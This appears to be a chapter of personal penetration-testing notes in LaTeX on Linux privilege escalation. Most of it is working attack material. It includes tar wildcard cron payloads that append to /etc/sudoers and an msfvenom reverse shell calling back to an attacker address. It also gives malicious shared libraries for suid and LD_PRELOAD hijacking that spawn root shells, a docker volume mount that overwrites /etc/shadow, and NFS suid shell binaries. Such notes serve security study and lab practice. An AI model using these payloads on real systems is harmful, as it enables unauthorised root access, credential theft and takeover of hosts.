\chapter{Privilege Escalation}
\label{chapter:linux-pe}

\section{Kernel Exploit}
\section{Kernel Exploit}

\section{Scheduled Task/Job} 

\subsection{Systemd Timers}
\subsection{cron}

\subsubsection{File permissions}

With write access to a script executed by a cron especialy run by root it is
possible to write a payload.

\subsubsection{PATH Environment Variable}

if a cron job is not explicitely referencing an absolute path it might by
apossible to create a malicious file that we can write in a directory that is
parsed before the directory containing file executed before the cron job.

pay attention to the \verb+PATH+ defined in the cron job


\subsubsection{Wildcard}

when a cron task contains a \verb+tar+ command with a wildcard it is possible
to do nasty stuff with writable access to the directory.
\begin{verbatim}
man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
\end{verbatim}

so if the cron task is the following:
\begin{verbatim}
*/01 * * * * cd /tmp && tar -zcf /tmp/backup.tar.gz *
\end{verbatim}

it is possible to create the following files in the tmp dir:
\begin{verbatim}
echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
\end{verbatim}

another soluthion is to craft a revershell 
\begin{verbatim}
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
\end{verbatim}
then:
\begin{verbatim}
touch /tmp/--checkpoint=1
touch //--checkpoint-action=exec=shell.elf
\end{verbatim}

\subsection{Container Orchestration Job}



\section{Abuse Elevation Control Mechanism (T1548)}
\subsection{Abuse suid / sgid}

\subsubsection{Shell escape sequences}
search for suid / guid that can be used and confirm with
\href{https://gtfobins.github.io/}{GTFOBins}

\subsubsection{Shared Object Hijacking}

for a given binary \verb+bin+ check with \verb+ldd+ if it uses special library
and with \verb+readelf -d+ if a special runpath has been set.

If so check if the \verb+runpath+ is writable and copy the \verb+libc.so+ in
the \verb+runpath+ renaming it as the custom library.

confirm with \verb+ldd+ that everything is ok before runing the binary that
should crash providing the name of a function \verb+fun+ that is missing.

then compile the following code as a shared library and put it in the
\verb+runpath+ instead of the special librabry.
\begin{verbatim}
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
\end{verbatim}

runing the binary should provide a shell.

\subsection{Abuse sudo}

\subsubsection{Shell escape sequences}
\verb+sudo -l+ search for authorized binary in \href{https://gtfobins.github.io/}{GTFOBins}

\subsubsection{Shared library highjacking}
There are multiple methods for specifying the location of dynamic libraries, so
the system will know where to look for them on program execution. This includes
the \verb+-rpath+ or \verb+-rpath-link+ flags when compiling a program, using
the environmental variables \verb+LD_RUN_PATH+ or \verb+LD_LIBRARY_PATH+,
placing libraries in the \verb+/lib+ or \verb+/usr/lib+ default directories, or
specifying another directory containing the libraries within the
\verb+/etc/ld.so.conf+ configuration file.

Additionally, the
\href{https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html}{LD\_PRELOAD}
environment variable can load a library
before executing a binary. The functions from this library are given preference
over the default ones. The shared objects required by a binary can be viewed
using the \verb+ldd+ utility.

if \verb+sudo -l+ return the \verb-env_keep+=LD_PRELOAD-

then compiling the following code as a shared library
\begin{verbatim}
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
\end{verbatim}

\begin{verbatim}
gcc -fPIC -shared -o root.so root.c -nostartfiles
\end{verbatim}

then launch the binary with:
\begin{verbatim}
sudo LD_PRELOAD=/tmp/root.so COMMAND
\end{verbatim}


\section{Privileged Groups}
\input{linux/pe/lx}

\subsection{Docker}
Placing a user in the docker group is essentially equivalent to root level
access to the file system without requiring a password. Members of the docker
group can spawn new docker containers. One example would be running the command
\begin{verbatim}
docker image ls

docker run -it \
    --volume /root:/mnt \
    --volume /etc/shadow:/tmp/shadow  \
    ubuntu 
    sh

echo "root:$(mkpasswd -m sha-512 foo foobarbaz):12345:0:::::" > /tmp/shadow

\end{verbatim} 

This command create a new Docker instance with the \verb+/root+ directory on
the host file system mounted as a volume. Once the container is started it is
possible to browse to the mounted directory and retrieve or add SSH keys for
the root user. This could be done for other directories such as \verb+/etc+
which could be used to retrieve the contents of the \verb+/etc/shadow+ file for
offline password cracking or adding a privileged user.

\subsection{Disk}

Users within the disk group have full access to any devices contained within
i\verb+/dev+, such as \verb+/dev/sda1+, which is typically the main device used
by the operating system. An attacker with these privileges can use
\verb+debugfs+ to access the entire file system with \verb+root+ level
privileges. As with the Docker group example, this could be leveraged to
retrieve SSH keys, credentials or to add a user.


\subsection{ADM}
Members of the adm group are able to read all logs stored in \verb+/var/log+.
This does not directly grant root access, but could be leveraged to gather
sensitive data stored in log files or enumerate user actions and running cron
jobs.


\section{Misc}

\subsection{Passive Traffic Capture}

If \verb+tcpdump+ is installed, unprivileged users may be able to capture
network traffic, including, in some cases, credentials passed in cleartext.
Several tools exist, such as
\href{https://github.com/DanMcInerney/net-creds}{net-creds} and
\href{https://github.com/lgandx/PCredz}{PCredz} that can be used to examine
data being passed on the wire. This may result in capturing sensitive
information such as credit card numbers and SNMP community strings. It may also
be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be
subjected to an offline brute force attack to reveal the plaintext password.
Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain
credentials that could be reused to escalate privileges on the host.


\subsection{Weak NFS permissions}
Files created via NFS inherit the remote user's ID. If the user is \verb+root+,
and \verb+root squashing+ is enabled, the ID will instead be set to the
\verb+nobody+ user.

Check the NFS share configuration: \verb+cat /etc/exports+ to see if an export
contains the \verb+no_root_squash+ option

on the attacker box mount the exported folder, craft a a malicious payload for
example:
\begin{verbatim}
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
\end{verbatim}

or more simply 
\begin{verbatim}
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
\end{verbatim}

copy as {\bf root} the binary on the mounted folder and set the \verb+suid-bit+
(\verb+chmod u+s+).

the go back on the target and execute the binary

\subsection{Hijacking Tmux sessions}
